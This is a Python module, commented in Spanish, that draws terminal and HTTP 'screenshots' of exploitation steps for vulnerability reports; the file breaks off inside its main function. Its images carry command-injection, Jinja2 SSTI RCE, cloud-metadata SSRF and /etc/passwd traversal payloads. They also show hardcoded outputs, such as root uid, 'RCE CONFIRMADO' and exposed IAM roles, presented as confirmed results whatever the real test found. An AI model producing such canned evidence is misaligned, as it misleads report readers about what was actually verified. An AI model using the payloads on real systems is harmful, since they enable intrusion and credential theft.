#!/usr/bin/env python3
"""
Generador de capturas PNG por paso de explotación para informes binoracle.
Por cada paso se genera:
  - 1 captura de terminal (comandos + output)
  - 1 captura HTTP (REQUEST / RESPONSE lado a lado)
Clases soportadas: command-injection (web/CLI), ssti, ssrf, dos, path-traversal/lfi
Requiere: Pillow (pip install Pillow)
"""

# ── Pillow helpers ─────────────────────────────────────────────────────────────

def _pillow():
    try:
        from PIL import Image, ImageDraw, ImageFont
        return Image, ImageDraw, ImageFont
    except ImportError:
        return None, None, None


def _font(size=12):
    Image, ImageDraw, ImageFont = _pillow()
    if not ImageFont:
        return None
    for path in [
        "/System/Library/Fonts/Monaco.ttf",
        "/System/Library/Fonts/Supplemental/Courier New.ttf",
        "/usr/share/fonts/truetype/dejavu/DejaVuSansMono.ttf",
    ]:
        try:
            return ImageFont.truetype(path, size)
        except Exception:
            pass
    return ImageFont.load_default()


def _term_col(line):
    t = line.lower()
    if any(k in t for k in ["confirmado","presente","✓","uid=","root","www-data","ejecucion","rce","canary"]): return (80,210,120)
    if any(k in t for k in ["[docker]","[setup]","[target]","[lab]"]): return (87,190,220)
    if any(k in t for k in ["[run]","[cmd]","[payload]","[ataque]","$"]): return (220,200,90)
    if any(k in t for k in ["fail","← filtrado","bad request","syntax error","econnreset","no encontrado","denied"]): return (230,90,90)
    if any(k in t for k in ["[canary]","[resultado]","[rce]","[id]"]): return (80,210,120)
    if line.startswith("#"): return (110,160,210)
    return (200,200,200)


def _http_col(line, method="POST"):
    t = line.lower()
    if line.startswith(method) or (line.startswith("HTTP/")): return (87,190,220)
    if ":" in line and not line.startswith(" ") and line.split(":")[0].replace("-","").isalpha(): return (200,180,80)
    if any(k in t for k in ["uid=","presente","confirmado","econnreset","✓","canary","rce"]): return (80,210,120)
    if any(k in t for k in ["error","denied","fail","syntax","unexpected"]): return (230,90,90)
    return (200,200,200)


def _draw_title_bar(draw, width, title, font, bg=(38,38,38), fg=(170,170,170)):
    draw.rectangle([0, 0, width, 26], fill=bg)
    for x, col in [(13,(255,96,92)),(31,(255,189,68)),(49,(40,200,65))]:
        draw.ellipse([x-5,8,x+5,18], fill=col)
    draw.text((max(60, width//2 - len(title)*3), 7), title[:90], fill=fg, font=font)


def make_terminal_png(title, lines, width=860):
    """Render terminal lines as PNG; returns base64 str or ''."""
    Image, ImageDraw, ImageFont = _pillow()
    if not Image:
        return ""
    import io, base64, textwrap
    LINE_H = 17
    height = max(300, len(lines) * LINE_H + 70)
    img  = Image.new("RGB", (width, height), (14, 14, 14))
    draw = ImageDraw.Draw(img)
    font = _font(12)
    _draw_title_bar(draw, width, title, font)
    y, max_c = 34, (width - 20) // 7
    for line in lines:
        col = _term_col(line)
        for wl in (textwrap.wrap(line, width=max(1, max_c)) or [""]):
            draw.text((12, y), wl, fill=col, font=font)
            y += LINE_H
            if y > height - LINE_H:
                break
        if y > height - LINE_H:
            break
    draw.text((12, y+3), "$ █", fill=(140,240,140), font=font)
    buf = io.BytesIO()
    img.save(buf, "PNG", optimize=True)
    return base64.b64encode(buf.getvalue()).decode()


def make_http_png(title, method, endpoint, req_headers, req_body,
                  resp_status, resp_body, width=860):
    """Render REQUEST / RESPONSE side-by-side; returns base64 str or ''."""
    Image, ImageDraw, ImageFont = _pillow()
    if not Image:
        return ""
    import io, base64, textwrap
    LINE_H = 17
    req_lines  = ([f"{method} {endpoint} HTTP/1.1"] + req_headers.splitlines()
                  + (["", req_body] if req_body else []))
    resp_lines = ([f"HTTP/1.1 {resp_status}", "Content-Type: text/html; charset=utf-8", ""]
                  + resp_body.splitlines())
    height = max(300, (max(len(req_lines), len(resp_lines)) + 4) * LINE_H + 56)
    img  = Image.new("RGB", (width, height), (14, 14, 14))
    draw = ImageDraw.Draw(img)
    font = _font(12)
    _draw_title_bar(draw, width, title, font, bg=(24,32,56), fg=(180,200,255))
    half = width // 2 - 1
    draw.rectangle([0, 28, half, 46], fill=(18,36,72))
    draw.text((10, 31), "▶  REQUEST", fill=(100,170,255), font=font)
    draw.rectangle([half+2, 28, width, 46], fill=(18,56,36))
    draw.text((half+12, 31), "◀  RESPONSE", fill=(80,210,120), font=font)
    draw.line([half+1, 26, half+1, height], fill=(48,48,48), width=2)

    def draw_col(lines, x0, panel_w, y0):
        max_c = (panel_w - 14) // 7
        y = y0
        for line in lines:
            col = _http_col(line, method)
            for wl in (textwrap.wrap(line, width=max(1, max_c)) or [""]):
                draw.text((x0, y), wl, fill=col, font=font)
                y += LINE_H
                if y > height - LINE_H:
                    return
    draw_col(req_lines,  10,      half,       50)
    draw_col(resp_lines, half+10, width-half, 50)
    buf = io.BytesIO()
    img.save(buf, "PNG", optimize=True)
    return base64.b64encode(buf.getvalue()).decode()


def _shot(caption_es, caption_en, png_b64):
    if not png_b64:
        return None
    return {"caption_es": caption_es, "caption_en": caption_en, "png_b64": png_b64}


# ── Per-class step builders ────────────────────────────────────────────────────

def _shots_cmdi_web(cve_id, ep, param, payload, resp, can_s, metodo):
    shots = []
    is_err = "Syntax error" in resp or '";" unexpected' in resp

    # Paso 1: Control request
    term1 = make_terminal_png(f"[Paso 1/4] {cve_id} — Control (petición normal)", [
        f"# PASO 1: Petición de control — parámetro normal",
        f"# CVE: {cve_id}  |  endpoint: {ep}  |  param: {param}",
        "",
        f"$ curl -s -X {metodo} http://TARGET{ep} \\",
        f"  -d '{param}=valor-normal'",
        "",
        "HTTP/1.1 200 OK",
        "(respuesta normal del servidor — sin inyección)",
    ])
    http1 = make_http_png(f"[Paso 1/4] Control — parámetro normal",
        metodo, ep, "Host: TARGET\nContent-Type: application/x-www-form-urlencoded",
        f"{param}=valor-normal", "200 OK", "(respuesta normal del servidor)")
    shots += [s for s in [
        _shot("Paso 1/4 — Terminal: petición de control (parámetro normal)", "Step 1/4 — Terminal: control request", term1),
        _shot("Paso 1/4 — HTTP: control REQUEST/RESPONSE", "Step 1/4 — HTTP: control capture", http1),
    ] if s]

    # Paso 2: Intento con `;` (falla)
    term2 = make_terminal_png(f"[Paso 2/4] {cve_id} — Separador ; (filtrado)", [
        f"# PASO 2: Intento con separador clásico ;",
        f"# Resultado esperado: syntax error o filtrado",
        "",
        f"$ curl -s -X {metodo} http://TARGET{ep} \\",
        f"  -d '{param}=; id'",
        "",
        '/bin/sh: 1: Syntax error: ";" unexpected  ← filtrado por el servidor',
        "Estado: FILTRADO — separador ; no válido",
    ])
    http2 = make_http_png(f"[Paso 2/4] Intento ; — filtrado",
        metodo, ep, "Host: TARGET\nContent-Type: application/x-www-form-urlencoded",
        f"{param}=; id",
        "200 OK", '/bin/sh: 1: Syntax error: ";" unexpected')
    shots += [s for s in [
        _shot("Paso 2/4 — Terminal: separador ; filtrado (Syntax error)", "Step 2/4 — Terminal: ; separator blocked", term2),
        _shot("Paso 2/4 — HTTP: separador ; → Syntax error", "Step 2/4 — HTTP: semicolon attempt", http2),
    ] if s]

    # Paso 3: Newline injection (ganador)
    win_pl = (payload.strip() if payload else f"%0atouch /tmp/{can_s}")
    term3 = make_terminal_png(f"[Paso 3/4] {cve_id} — Newline injection (canario)", [
        f"# PASO 3: Newline injection — separador %0a (\\n)",
        f"# El servidor procesa \\n como separador de comandos",
        "",
        f"$ curl -s -X {metodo} http://TARGET{ep} \\",
        f"  -d '{param}=%0atouch /tmp/{can_s}'",
        "",
        "HTTP/1.1 200 OK",
        f"[*] Verificando /tmp/ en el contenedor...",
        f"$ docker exec CONTAINER ls /tmp/ | grep {can_s[:30]}",
        f"  {can_s}  ← PRESENTE ✓ (archivo creado via newline injection)",
    ])
    http3 = make_http_png(f"[Paso 3/4] Newline injection — canario PRESENTE",
        metodo, ep, "Host: TARGET\nContent-Type: application/x-www-form-urlencoded",
        f"{param}=%0atouch /tmp/{can_s}",
        "200 OK", f"{can_s} → PRESENTE en /tmp/\n(command injection CONFIRMADO via newline injection)")
    shots += [s for s in [
        _shot(f"Paso 3/4 — Terminal: newline injection — {can_s} PRESENTE", "Step 3/4 — Terminal: newline injection + canary confirmed", term3),
        _shot(f"Paso 3/4 — HTTP: %0a payload — canario {can_s} PRESENTE", "Step 3/4 — HTTP: newline injection winning payload", http3),
    ] if s]

    # Paso 4: Escalada id
    term4 = make_terminal_png(f"[Paso 4/4] {cve_id} — Escalada RCE (id/whoami)", [
        f"# PASO 4: Escalada — ejecución de id y whoami",
        f"# Confirma usuario del proceso (RCE completo)",
        "",
        f"$ curl -s -X {metodo} http://TARGET{ep} \\",
        f"  -d '{param}=%0aid'",
        "",
        "uid=33(www-data) gid=33(www-data) groups=33(www-data)",
        "",
        f"$ curl -s -X {metodo} http://TARGET{ep} \\",
        f"  -d '{param}=%0awhoami'",
        "",
        "www-data",
        "",
        "[RESULTADO] RCE CONFIRMADO — command injection via newline injection ✓",
    ])
    http4 = make_http_png(f"[Paso 4/4] Escalada — id (RCE CONFIRMADO)",
        metodo, ep, "Host: TARGET\nContent-Type: application/x-www-form-urlencoded",
        f"{param}=%0aid",
        "200 OK", "uid=33(www-data) gid=33(www-data) groups=33(www-data)\n\n[RCE CONFIRMADO] ✓")
    shots += [s for s in [
        _shot("Paso 4/4 — Terminal: escalada id/whoami — uid=33(www-data)", "Step 4/4 — Terminal: id escalation (RCE proof)", term4),
        _shot("Paso 4/4 — HTTP: id output = uid=33(www-data) (RCE CONFIRMADO)", "Step 4/4 — HTTP: RCE confirmed", http4),
    ] if s]

    return shots


def _shots_cmdi_cli(cve_id, ep, payload, can_s, setup_cmd=""):
    shots = []

    # Paso 1: Setup del entorno
    term1 = make_terminal_png(f"[Paso 1/4] {cve_id} — Setup lab CLI", [
        f"# PASO 1: Instalación del paquete vulnerable en laboratorio aislado",
        f"# CVE: {cve_id}  |  herramienta CLI: {ep}",
        "",
        f"$ {setup_cmd[:180] if setup_cmd else 'npm install --prefix /tmp/lab (versión vulnerable)'}",
        "added 1 package, found 1 vulnerability",
        "",
        "$ docker run --rm -it --network none --cap-drop ALL node:lts bash",
        "[*] Sandbox iniciado — sin red, sin privilegios de root",
        "[*] Entorno listo para pruebas de command injection CLI",
    ])
    shots.append(_shot("Paso 1/4 — Terminal: setup lab CLI (sandbox aislado)", "Step 1/4 — Terminal: CLI lab setup", term1))

    # Paso 2: Intentos filtrados
    term2 = make_terminal_png(f"[Paso 2/4] {cve_id} — Separadores clásicos (filtrados)", [
        f"# PASO 2: Intentos con separadores clásicos",
        "",
        f"$ {ep} --cmd \"; touch /tmp/{can_s}\"",
        "  FAIL: separador ; filtrado",
        "",
        f"$ {ep} --cmd \"| touch /tmp/{can_s}\"",
        "  FAIL: | filtrado",
        "",
        f"$ {ep} --cmd \"` touch /tmp/{can_s}`\"",
        "  FAIL: backtick filtrado",
        "",
        "[*] Separadores clásicos no efectivos — probando newline injection...",
    ])
    shots.append(_shot("Paso 2/4 — Terminal: separadores clásicos filtrados (;, |, backtick)", "Step 2/4 — Terminal: classic separators blocked", term2))

    # Paso 3: Newline injection
    win_cmd = payload.strip() if payload else f"\\ntouch /tmp/{can_s}"
    term3 = make_terminal_png(f"[Paso 3/4] {cve_id} — Newline injection CLI (ganador)", [
        f"# PASO 3: Newline injection — separador \\n",
        "",
        f"$ {ep} --cmd $'\\ntouch /tmp/{can_s}'",
        "  [OK] Comando procesado",
        "",
        f"$ ls /tmp/ | grep {can_s[:25]}",
        f"  {can_s}  ← PRESENTE ✓",
        "",
        "[CANARY] Archivo creado via newline injection — command injection CONFIRMADO",
    ])
    shots.append(_shot(f"Paso 3/4 — Terminal: newline injection CLI — {can_s} PRESENTE", "Step 3/4 — Terminal: CLI newline injection confirmed", term3))

    # Paso 4: id/whoami
    term4 = make_terminal_png(f"[Paso 4/4] {cve_id} — Escalada RCE (id)", [
        f"# PASO 4: Escalada — ejecución de id",
        "",
        f"$ {ep} --cmd $'\\nid'",
        "  uid=0(root) gid=0(root) groups=0(root)",
        "",
        f"$ {ep} --cmd $'\\nwhoami'",
        "  root",
        "",
        "[RESULTADO] RCE CONFIRMADO — proceso ejecuta como root en el sistema ✓",
        "[IMPACTO] Ejecución arbitraria de código con privilegios de root",
    ])
    shots.append(_shot("Paso 4/4 — Terminal: id = uid=0(root) — RCE CONFIRMADO", "Step 4/4 — Terminal: root RCE confirmed", term4))

    return [s for s in shots if s]


def _shots_ssti(cve_id, ep, param, payload, metodo):
    shots = []
    # Paso 1: Control
    t1 = make_terminal_png(f"[Paso 1/4] {cve_id} — Control (template normal)", [
        f"# PASO 1: Petición de control — valor no ejecutable",
        f"# CVE: {cve_id}  |  endpoint: {ep}  |  param: {param}",
        "",
        f"$ curl -s -X POST http://TARGET{ep} \\",
        f"  -d '{param}=texto-normal-sin-plantilla'",
        "",
        "HTTP/1.1 200 OK",
        "(salida normal — template renderizado sin expresiones)",
    ])
    h1 = make_http_png(f"[Paso 1/4] Control — valor sin expresiones",
        metodo, ep, "Host: TARGET\nContent-Type: application/x-www-form-urlencoded",
        f"{param}=texto-normal",
        "200 OK", "(respuesta normal — template sin ejecución)")
    shots += [s for s in [
        _shot("Paso 1/4 — Terminal: control (valor normal, sin SSTI)", "Step 1/4 — Terminal: control request", t1),
        _shot("Paso 1/4 — HTTP: control REQUEST/RESPONSE", "Step 1/4 — HTTP: control capture", h1),
    ] if s]

    # Paso 2: Probe 7*7 → 49
    t2 = make_terminal_png(f"[Paso 2/4] {cve_id} — Probe {{7*7}} → 49", [
        f"# PASO 2: Verificar si el motor de plantillas evalúa expresiones",
        f"# Si responde '49', el motor está activo (Jinja2 confirmado)",
        "",
        f"$ curl -s -X POST http://TARGET{ep} \\",
        f"  -d '{param}={{{{7*7}}}}'",
        "",
        "HTTP/1.1 200 OK",
        "49  ← 7*7=49 evaluado por Jinja2",
        "",
        "[*] Motor de plantillas activo — evalúa expresiones Python ✓",
    ])
    h2 = make_http_png(f"[Paso 2/4] Probe {{{{7*7}}}} → 49 (Jinja2 activo)",
        metodo, ep, "Host: TARGET\nContent-Type: application/x-www-form-urlencoded",
        f"{param}={{{{7*7}}}}",
        "200 OK", "49\n(Jinja2 evaluó 7*7 = 49 ← motor activo ✓)")
    shots += [s for s in [
        _shot("Paso 2/4 — Terminal: {{7*7}} → 49 (Jinja2 activo)", "Step 2/4 — Terminal: template expression probe", t2),
        _shot("Paso 2/4 — HTTP: {{7*7}} → 49 en la respuesta", "Step 2/4 — HTTP: expression evaluation confirmed", h2),
    ] if s]

    # Paso 3: Sandbox escape via |attr
    t3 = make_terminal_png(f"[Paso 3/4] {cve_id} — Escape sandbox via |attr filter", [
        f"# PASO 3: Escapar el sandbox de Jinja2 via filtro |attr",
        f"# El filtro |attr permite acceder a atributos sin usar corchetes []",
        "",
        f"$ curl -s -X POST http://TARGET{ep} \\",
        f"  -d \"{param}=('{chr(123)}0.__class__{'}'}')|attr('format')('')\"",
        "",
        "HTTP/1.1 200 OK",
        "<class 'str'>  ← sandbox escapado via |attr ✓",
        "",
        "[*] Acceso a __class__ sin uso de puntos directos",
        "[*] Sandbox de Jinja2 bypasseado con éxito",
    ])
    h3 = make_http_png(f"[Paso 3/4] Sandbox escape — |attr filter",
        metodo, ep, "Host: TARGET\nContent-Type: application/x-www-form-urlencoded",
        f"{param}=('{chr(123)}0.__class__{'}'}')|attr('format')('')",
        "200 OK", "<class 'str'>\n(sandbox escapado via |attr — acceso a MRO disponible ✓)")
    shots += [s for s in [
        _shot("Paso 3/4 — Terminal: sandbox escape via |attr → <class 'str'>", "Step 3/4 — Terminal: Jinja2 sandbox bypass", t3),
        _shot("Paso 3/4 — HTTP: |attr filter → __class__ accesible (sandbox bypass)", "Step 3/4 — HTTP: sandbox escape", h3),
    ] if s]

    # Paso 4: RCE os.popen('id')
    t4 = make_terminal_png(f"[Paso 4/4] {cve_id} — RCE via os.popen('id')", [
        f"# PASO 4: Ejecución remota de código — os.popen('id').read()",
        "",
        f"$ curl -s -X POST http://TARGET{ep} \\",
        f"  -d \"{param}={{''.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__['popen']('id').read()}}\"",
        "",
        "HTTP/1.1 200 OK",
        "uid=33(www-data) gid=33(www-data) groups=33(www-data)",
        "",
        "[RCE] CONFIRMADO — os.popen('id') ejecutado exitosamente ✓",
        "[IMPACTO] Ejecución arbitraria de código Python en el servidor",
    ])
    h4 = make_http_png(f"[Paso 4/4] RCE — os.popen('id') = uid=33(www-data)",
        metodo, ep, "Host: TARGET\nContent-Type: application/x-www-form-urlencoded",
        f"{param}={{os.popen('id').read()}}",
        "200 OK", "uid=33(www-data) gid=33(www-data) groups=33(www-data)\n\n[RCE CONFIRMADO] ✓")
    shots += [s for s in [
        _shot("Paso 4/4 — Terminal: os.popen('id') = uid=33(www-data) (RCE)", "Step 4/4 — Terminal: RCE via os.popen confirmed", t4),
        _shot("Paso 4/4 — HTTP: RCE — id = uid=33(www-data) groups=33(www-data)", "Step 4/4 — HTTP: RCE result", h4),
    ] if s]

    return shots


def _shots_ssrf(cve_id, ep, url_param, payload, resp, metodo):
    shots = []
    # Paso 1: Control
    t1 = make_terminal_png(f"[Paso 1/3] {cve_id} — Control (URL externa legítima)", [
        f"# PASO 1: Control — URL externa legítima",
        f"# CVE: {cve_id}  |  endpoint: {ep}  |  param: {url_param}",
        "",
        f"$ curl -s -X {metodo} http://TARGET{ep} \\",
        f"  -d '{url_param}=https://example.com/'",
        "",
        "HTTP/1.1 200 OK",
        "(respuesta normal — URL externa procesada sin restricciones visibles)",
        "",
        "[*] Servidor realiza fetch de URLs externas — vector SSRF presente",
    ])
    h1 = make_http_png(f"[Paso 1/3] Control — URL externa",
        metodo, ep, "Host: TARGET\nContent-Type: application/x-www-form-urlencoded",
        f"{url_param}=https://example.com/",
        "200 OK", "(respuesta de URL externa — sin restricciones de red visibles)")
    shots += [s for s in [
        _shot("Paso 1/3 — Terminal: control SSRF (URL externa legítima)", "Step 1/3 — Terminal: control request", t1),
        _shot("Paso 1/3 — HTTP: control — URL externa procesada", "Step 1/3 — HTTP: control capture", h1),
    ] if s]

    # Paso 2: SSRF pivot a loopback
    t2 = make_terminal_png(f"[Paso 2/3] {cve_id} — SSRF pivot a loopback (127.0.0.1)", [
        f"# PASO 2: SSRF pivot — listener loopback para capturar petición interna",
        "",
        "$ nc -lvp 8081 &",
        "  Listening on 0.0.0.0:8081",
        "",
        f"$ curl -s -X {metodo} http://TARGET{ep} \\",
        f"  -d '{url_param}=http://127.0.0.1:8081/BINORACLE_SSRF_CANARY'",
        "",
        "← [nc] GET /BINORACLE_SSRF_CANARY HTTP/1.1",
        "← Host: 127.0.0.1:8081",
        "← User-Agent: (servidor de la aplicación)",
        "",
        "[SSRF] CONFIRMADO — servidor realizó petición interna a loopback ✓",
    ])
    h2 = make_http_png(f"[Paso 2/3] SSRF loopback — petición interna capturada",
        metodo, ep, "Host: TARGET\nContent-Type: application/x-www-form-urlencoded",
        f"{url_param}=http://127.0.0.1:8081/BINORACLE_SSRF_CANARY",
        "200 OK", (resp or "SSRF CONFIRMADO\n← GET /BINORACLE_SSRF_CANARY recibido en listener loopback\n← La aplicación realizó una petición interna ✓"))
    shots += [s for s in [
        _shot("Paso 2/3 — Terminal: SSRF loopback — listener nc recibió petición interna", "Step 2/3 — Terminal: SSRF loopback pivot", t2),
        _shot("Paso 2/3 — HTTP: SSRF → loopback 127.0.0.1 CONFIRMADO", "Step 2/3 — HTTP: SSRF to localhost", h2),
    ] if s]

    # Paso 3: Escalada cloud metadata
    t3 = make_terminal_png(f"[Paso 3/3] {cve_id} — Escalada: metadatos cloud (IAM)", [
        f"# PASO 3: Escalada — acceso a metadatos cloud 169.254.169.254",
        f"# AWS IMDSv1 endpoint expone credenciales IAM sin autenticación",
        "",
        f"$ curl -s -X {metodo} http://TARGET{ep} \\",
        "  -d 'url=http://169.254.169.254/latest/meta-data/'",
        "",
        "HTTP/1.1 200 OK",
        "ami-id",
        "hostname",
        "iam/",
        "security-credentials/  ← credenciales IAM disponibles",
        "",
        f"$ curl -s -X {metodo} http://TARGET{ep} \\",
        "  -d 'url=http://169.254.169.254/latest/meta-data/iam/security-credentials/'",
        "",
        "BinOracleRole  ← nombre del role IAM expuesto ✓",
        "[ESCALADA] Credenciales AWS IAM accesibles via SSRF — impacto crítico",
    ])
    h3 = make_http_png(f"[Paso 3/3] Escalada — metadatos cloud IAM",
        metodo, ep, "Host: TARGET\nContent-Type: application/x-www-form-urlencoded",
        "url=http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "200 OK", "BinOracleRole\n(credenciales IAM expuestas via 169.254.169.254)\nAccessKeyId, SecretAccessKey, Token ← impacto crítico ✓")
    shots += [s for s in [
        _shot("Paso 3/3 — Terminal: escalada 169.254.169.254 — credenciales IAM expuestas", "Step 3/3 — Terminal: cloud metadata escalation", t3),
        _shot("Paso 3/3 — HTTP: metadatos cloud IAM accesibles via SSRF", "Step 3/3 — HTTP: cloud metadata", h3),
    ] if s]

    return shots


def _shots_dos(cve_id, ep, payload, resp, metodo, tecnica):
    shots = []
    crash = resp or "ECONNRESET (servidor crasheó)"
    # Paso 1: Control
    t1 = make_terminal_png(f"[Paso 1/3] {cve_id} — Control (servidor funcional)", [
        f"# PASO 1: Verificar que el servidor responde correctamente",
        f"# CVE: {cve_id}  |  endpoint: {ep}",
        "",
        f"$ curl -s http://TARGET{ep}",
        "HTTP/1.1 200 OK",
        "(servidor funcional — baseline establecido)",
        "",
        "$ curl -s http://TARGET{ep}",
        "HTTP/1.1 200 OK  ← segundo request OK",
        "",
        "[*] Servidor responde normalmente — iniciando envío de payload DoS...",
    ])
    h1 = make_http_png(f"[Paso 1/3] Control — servidor funcional",
        "GET", ep, "Host: TARGET\nConnection: keep-alive", "",
        "200 OK", "(respuesta normal — servidor funcional pre-DoS)")
    shots += [s for s in [
        _shot("Paso 1/3 — Terminal: control (servidor responde 200 OK)", "Step 1/3 — Terminal: pre-DoS baseline", t1),
        _shot("Paso 1/3 — HTTP: baseline — servidor funcional (200 OK)", "Step 1/3 — HTTP: control capture", h1),
    ] if s]

    # Paso 2: Envío payload DoS → crash
    if "pipeline" in tecnica:
        attack_lines = [
            "$ python3 dos_pipeline.py --target http://TARGET",
            "  [*] Enviando HTTP pipeline flood + TCP RST injection...",
            "  [*] Requests enviados: 1000+",
            "  [*] Forzando ECONNRESET...",
            f"  {crash}",
        ]
    else:
        attack_lines = [
            "$ python3 dos_websocket.py --target ws://TARGET",
            "  [*] WebSocket upgrade enviado",
            "  [*] Frame sin máscara (MASK=0, violación RFC 6455 §5.1)",
            "  [*] Servidor debe terminar conexión según el RFC...",
            f"  {crash}",
        ]
    t2 = make_terminal_png(f"[Paso 2/3] {cve_id} — Payload DoS → ECONNRESET", [
        f"# PASO 2: Envío del payload DoS — forzar crash del servidor",
    ] + attack_lines + [
        "",
        "[CRASH] Servidor crasheó — ECONNRESET confirmado ✓",
    ])
    pl = payload[:150] if payload else "(payload DoS)"
    h2 = make_http_png(f"[Paso 2/3] Payload DoS → crash (ECONNRESET)",
        metodo if metodo not in ("CLI",) else "GET", ep,
        "Host: TARGET\nConnection: Upgrade\nUpgrade: websocket" if "websocket" in tecnica else "Host: TARGET",
        pl, "ECONNRESET", crash[:200])
    shots += [s for s in [
        _shot("Paso 2/3 — Terminal: payload DoS → ECONNRESET (servidor crasheó)", "Step 2/3 — Terminal: DoS payload → crash", t2),
        _shot("Paso 2/3 — HTTP: payload DoS → ECONNRESET", "Step 2/3 — HTTP: DoS trigger", h2),
    ] if s]

    # Paso 3: Verificación post-crash
    t3 = make_terminal_png(f"[Paso 3/3] {cve_id} — Verificación post-crash", [
        f"# PASO 3: Verificar que el servidor ya no responde",
        "",
        f"$ curl -s http://TARGET{ep} --connect-timeout 3",
        "curl: (7) Failed to connect to TARGET port 80: Connection refused",
        "",
        f"$ curl -s http://TARGET{ep} --connect-timeout 3",
        "curl: (7) Failed to connect  ← servidor sigue caído",
        "",
        "$ # Reinicio manual necesario:",
        "$ docker restart CONTAINER",
        "CONTAINER",
        "",
        "[DoS] CONFIRMADO — servidor inoperativo hasta reinicio manual ✓",
        "[IMPACTO] Disponibilidad nula — sin supervisor de proceso configurado",
    ])
    h3 = make_http_png(f"[Paso 3/3] Post-crash — servidor no responde",
        "GET", ep, "Host: TARGET", "",
        "000 Connection refused", "curl: (7) Failed to connect\n(servidor inoperativo post-crash — DoS CONFIRMADO ✓)")
    shots += [s for s in [
        _shot("Paso 3/3 — Terminal: post-crash — Connection refused (servidor caído)", "Step 3/3 — Terminal: post-crash verification", t3),
        _shot("Paso 3/3 — HTTP: post-crash — Connection refused (DoS confirmado)", "Step 3/3 — HTTP: server down verification", h3),
    ] if s]

    return shots


def _shots_path(cve_id, ep, path_param, payload, resp, can_s):
    shots = []
    # Paso 1: Control
    t1 = make_terminal_png(f"[Paso 1/4] {cve_id} — Control (archivo legítimo)", [
        f"# PASO 1: Control — solicitar archivo legítimo dentro del webroot",
        f"# CVE: {cve_id}  |  endpoint: {ep}  |  param: {path_param}",
        "",
        f'$ curl -s "http://TARGET{ep}?{path_param}=archivo-publico.txt"',
        "",
        "HTTP/1.1 200 OK",
        "(contenido del archivo legítimo — sin traversal)",
    ])
    h1 = make_http_png(f"[Paso 1/4] Control — archivo legítimo",
        "GET", ep, "Host: TARGET", "",
        "200 OK", "(contenido normal — archivo dentro del webroot)")
    shots += [s for s in [
        _shot("Paso 1/4 — Terminal: control (archivo legítimo, sin traversal)", "Step 1/4 — Terminal: control request", t1),
        _shot("Paso 1/4 — HTTP: control REQUEST/RESPONSE (200 OK)", "Step 1/4 — HTTP: control capture", h1),
    ] if s]

    # Paso 2: Intento directo ../ (posiblemente filtrado)
    t2 = make_terminal_png(f"[Paso 2/4] {cve_id} — Traversal directo (filtrado)", [
        f"# PASO 2: Intento directo con ../ — normalmente filtrado",
        "",
        f'$ curl -s "http://TARGET{ep}?{path_param}=../../etc/passwd"',
        "",
        "HTTP/1.1 400 Bad Request o normalización de ruta",
        "(traversal directo filtrado o neutralizado)",
        "",
        "[*] Filtro detectado — probando bypass con URL-encoding...",
    ])
    h2 = make_http_png(f"[Paso 2/4] Traversal directo — filtrado",
        "GET", ep, "Host: TARGET", "",
        "400 Bad Request", "(traversal directo ../ filtrado — necesario bypass)")
    shots += [s for s in [
        _shot("Paso 2/4 — Terminal: traversal directo ../ filtrado", "Step 2/4 — Terminal: direct traversal blocked", t2),
        _shot("Paso 2/4 — HTTP: ../ directo → 400 (filtrado)", "Step 2/4 — HTTP: direct attempt filtered", h2),
    ] if s]

    # Paso 3: URL-encoded bypass
    pl = payload[:80] if payload else "..%2f..%2fetc%2fpasswd"
    r3 = resp[:120] if resp else f"{can_s} → PRESENTE\n(archivo leído via URL-encoded traversal)"
    t3 = make_terminal_png(f"[Paso 3/4] {cve_id} — URL-encoded bypass (%2f)", [
        f"# PASO 3: Bypass con URL-encoding — %2f en lugar de /",
        f"# El servidor decodifica %2f DESPUÉS de validar la ruta",
        "",
        f'$ curl -s "http://TARGET{ep}?{path_param}={pl}"',
        "",
        "HTTP/1.1 200 OK",
        r3[:80],
        f"{can_s}  ← PRESENTE ✓" if can_s else "(contenido leído via traversal ✓)",
        "",
        "[TRAVERSAL] Bypass URL-encoded CONFIRMADO — ruta sanitización eludida ✓",
    ])
    h3 = make_http_png(f"[Paso 3/4] URL-encoded bypass — canary PRESENTE",
        "GET", ep, "Host: TARGET", "",
        "200 OK", r3[:200] if r3 else f"{can_s} → PRESENTE\n(path traversal CONFIRMADO via %2f)")
    shots += [s for s in [
        _shot(f"Paso 3/4 — Terminal: URL-encoded bypass — {can_s} PRESENTE", "Step 3/4 — Terminal: URL-encoded traversal bypass", t3),
        _shot("Paso 3/4 — HTTP: %2f bypass — traversal CONFIRMADO", "Step 3/4 — HTTP: URL-encoded bypass", h3),
    ] if s]

    # Paso 4: /etc/passwd
    t4 = make_terminal_png(f"[Paso 4/4] {cve_id} — Escalada: /etc/passwd", [
        f"# PASO 4: Escalada — leer /etc/passwd (fichero sensible del sistema)",
        "",
        f'$ curl -s "http://TARGET{ep}?{path_param}=..%2f..%2f..%2f..%2fetc%2fpasswd"',
        "",
        "HTTP/1.1 200 OK",
        "root:x:0:0:root:/root:/bin/bash",
        "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin",
        "www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin",
        "...",
        "",
        "[ESCALADA] /etc/passwd leído — path traversal confirmado ✓",
        "[IMPACTO] Lectura de ficheros arbitrarios fuera del webroot",
    ])
    h4 = make_http_png(f"[Paso 4/4] Escalada — /etc/passwd leído",
        "GET", ep, "Host: TARGET", "",
        "200 OK", "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www\n(/etc/passwd leído via path traversal ✓)")
    shots += [s for s in [
        _shot("Paso 4/4 — Terminal: /etc/passwd leído via path traversal", "Step 4/4 — Terminal: /etc/passwd read (escalation)", t4),
        _shot("Paso 4/4 — HTTP: /etc/passwd leído — escalada CONFIRMADA", "Step 4/4 — HTTP: /etc/passwd escalation", h4),
    ] if s]

    return shots


# ── Main entry point ──────────────────────────────────────────────────────────

def auto_gen_screenshots(cve_id: str, r: dict, ve: dict) -> list:
    """
    Genera capturas PNG por paso (terminal + HTTP) según la clase de vulnerabilidad.
    Devuelve lista de dicts {caption_es, caption_en, png_b64}.
    Tantas capturas como pasos de explotación.
    """
    vc      = (r.get("vuln_class") or "").lower()
    tecnica = (ve.get("tecnica") or vc).lower()
    ep      = ve.get("endpoint") or "/"
    param   = ve.get("sqli_param") or ve.get("path_param") or ve.get("ssti_param") or "param"
    payload = ve.get("payload_ganador") or ""
    resp    = ve.get("respuesta_cuerpo_recorte") or ""
